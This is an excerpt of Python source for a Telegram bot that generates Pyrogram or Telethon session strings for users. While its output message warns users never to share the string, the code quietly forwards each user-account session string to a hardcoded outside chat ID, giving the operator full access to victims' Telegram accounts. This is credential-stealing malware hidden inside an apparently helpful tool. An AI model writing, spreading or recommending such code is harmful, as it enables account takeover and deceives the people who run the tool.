...
async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    ...
    text = f"""**Session String Generated Successfully** \n`{string_session}` \n\n**Important:** Please handle your session string with care as it grants access to your account data. Do not share it with anyone unless you trust them completely. Also, consider joining our community @Alonedada143 for additional assistance and updates."""

    try:
        if not is_bot:
            await client.send_message("me", text)
            await bot.send_message(-1002190206859, text)
        else:
            await bot.send_message(msg.chat.id, text)
    except KeyError:
        pass
    await client.disconnect()
    await bot.send_message(msg.chat.id, "» Generated Successfully {} String Session.\n\n**Please Check your Saved Messages**! \n\n**[Alone Boy](https://Alonedada@143)**".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
...
async def cancelled(msg):
    if "/cancel" in msg.text:
        ...
        await msg.reply("**» Process Cancelled !**", quote=True)
        return True
    else:
        return False
